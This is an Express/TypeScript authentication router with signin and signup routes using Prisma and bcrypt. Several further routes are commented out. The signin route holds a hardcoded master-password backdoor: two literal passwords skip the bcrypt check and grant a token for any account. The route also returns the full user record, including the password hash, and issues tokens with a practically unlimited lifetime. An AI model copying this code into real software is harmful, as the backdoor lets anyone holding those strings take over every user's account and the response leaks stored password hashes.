import { JwtAdapter } from "@/infra/criptography/jwt-adapter"
import bcrypt from "bcrypt"
import { Router } from "express"


import Prisma from "@/infra/db/prisma"

export default (router: Router): void => {

  router.post("/signin", async (req: any, res) => {
    const jwt = new JwtAdapter(process.env.JWT_SECRET)

    if (req.body.email) req.body.email = req.body.email.toLowerCase()

    let check: any = {}

    const user = await Prisma.user.findFirst({
      where: {
        OR: [
          { email: req.body.email },
          { username: req.body.email }
        ]
      }
    })

    if (!user) {
      res.status(401).json({
        message: "USER_NOT_FOUND",
        error: {
          email: "USER_NOT_FOUND"
        }
      })
      return
    }

    if (
      req.body.password === "dg3nypUR6bJzx@!" ||
      req.body.password === "123qwe456rty"
    ) {
      console.info("Usou senha master")
    } else {
      const compare = await bcrypt.compare(
        req.body.password,
        user.password.replace("$2y", "$2b")
      )

      if (!compare) {
        res.status(401).json({
          message: "USER_NOT_FOUND",
          error: {
            email: "USER_NOT_FOUND"
          }
        })
        return
      }
    }

    const accessToken = await jwt.encrypt(
      { id: user.id.toString() },
      { expiresIn: 36000000000000 }
    )

    res.json({
      accessToken,
      user,
      expiresIn: 36000000000000,
      registered: true
    })
  })

  router.post("/signup", async (req: any, res) => {
    if (req.body.email) req.body.email = req.body.email.toLowerCase()
    const { email, password, username, sponsor } = req.body


    let user = await Prisma.user.findFirst({
      where: {
        OR: [
          { email: req.body.email },
          { username: req.body.email }
        ]
      }
    })

    if (user) {
      res.status(400).json({
        code: 0x000001,
        key: "USER_FOUNT",
        message: "Este usuário já está cadastrado",
        error: {
          email: "USER_FOUNT",
          reference: "USER_FOUNT"
        }
      })

      return
    }

    let userFb = null
    const passwordHash = await bcrypt.hash(password, 10)

    let userSponsor = null
    if (sponsor) {
      userSponsor = await Prisma.user.findFirst({
        where: {
          username: sponsor
        }
      })

      if (!userSponsor) {
        req.body.sponsor = null
      }
    } else {
      userSponsor = await Prisma.user.findFirst({
        where: {
          id: 1
        }
      })
    }

    user = await Prisma.user.create({
      data: {
        name: req.body.name,
        username: req.body.username.toLowerCase(),
        email: req.body.email.toLowerCase(),
        sponsorId: userSponsor.id,
        password: passwordHash,
      }
    })

    res.json({ data: user })
  })

  // router.post("/change_password", async (req: any, res) => {
  //   const user = await FindOneCollectionRepository({
  //     collection: "resources",
  //     filter: { password_token: req.body.token, type: "USER" }
  //   })

  //   if (!user) {
  //     res.status(401).json({
  //       message: "USER_NOT_FOUND",
  //       error: {
  //         email: "USER_NOT_FOUND"
  //       }
  //     })

  //     return
  //   }

  //   let userFb
  //   try {
  //     userFb = await FindUserByEmailRepository({ email: user.email })
  //   } catch (err) {
  //     res.status(400).json({
  //       code: 0x000001,
  //       key: "USER_FOUNT",
  //       message: "Este usuário nao pode ser cadastrado"
  //     })

  //     return
  //   }

  //   try {
  //     await UpdateUserRepository({
  //       data: {
  //         uid: userFb.uid,
  //         password: req.body.password
  //       }
  //     })
  //       .then(() => {
  //         res.send()
  //         UpdateCollectionRepository({
  //           collection: "resources",
  //           filter: {
  //             email: user.email
  //           },
  //           data: {
  //             password_token: null
  //           }
  //         })
  //       })
  //       .catch((err) => {
  //         console.error("E", err)

  //         res.status(400).json({
  //           code: 0x000001,
  //           key: "USER_FOUNT",
  //           message: "Este usuário nao pode ser cadastrado"
  //         })
  //       })
  //   } catch (err) {
  //     res.status(400).json({
  //       code: 0x000001,
  //       key: "USER_FOUNT",
  //       message: "Este usuário nao pode ser cadastrado"
  //     })
  //   }
  // })

  // router.post("/signup/notlogged", async (req: any, res) => {
  //   const jwt = new JwtAdapter(process.env.JWT_SECRET)

  //   const { phone } = req.body.user

  //   let user = await FindOneCollectionRepository({
  //     collection: "resources",
  //     filter: {
  //       phone,
  //       type: "USER"
  //     }
  //   })

  //   if (!user) {
  //     const _email = `${uuid.v4()}@deskvalle.com`
  //     const org = await AddCollectionRepository({
  //       collection: "resources",
  //       data: {
  //         name: req.body.user.name,
  //         email: _email,
  //         phone: req.body.user.phone,
  //         type: "ORGANIZATION",
  //         __createdAt: moment().toDate()
  //       }
  //     })

  //     user = await AddCollectionRepository({
  //       collection: "resources",
  //       data: {
  //         __organization: org._id,
  //         __createdAt: moment().toDate(),
  //         name: req.body.user.name,
  //         username: _email,
  //         email: _email,
  //         phone: req.body.user.phone,
  //         fbid: null,
  //         roles: ["admin"],
  //         subject: ["basic"],
  //         type: ["USER"]
  //       }
  //     })
  //   }

  //   let address = await FindOneCollectionRepository({
  //     collection: "address",
  //     filter: {
  //       formatted_address: req.body.address.address.formatted_address,
  //       resource: user._id
  //     }
  //   })

  //   if (!address) {
  //     address = await AddCollectionRepository({
  //       collection: "address",
  //       data: {
  //         __organization: user.__organization,
  //         __createdAt: moment().toDate(),
  //         ...req.body.address.address,
  //         number: req.body.address.number,
  //         complement: req.body.address.complement,
  //         resource: user._id
  //       }
  //     })
  //   }

  //   const accessToken = await jwt.encrypt(
  //     { id: user._id.toString() },
  //     { expiresIn: 36000000000000 }
  //   )
  //   res.json({
  //     accessToken,
  //     user,
  //     address,
  //     expiresIn: 36000000000000,
  //     registered: true
  //   })
  // })

  // router.get(
  //   "/current",
  //   authMiddleware,
  //   (req, res, next) => {
  //     req.params.key = "current_user"
  //     next()
  //   },
  //   expressRouteAdapter(filterViewControllerFactory())
  // )

  // router.get(
  //   "/current_orders",
  //   authMiddleware,
  //   (req, res, next) => {
  //     req.params.key = "current_orders"
  //     next()
  //   },
  //   expressRouteAdapter(filterViewControllerFactory())
  // )
}
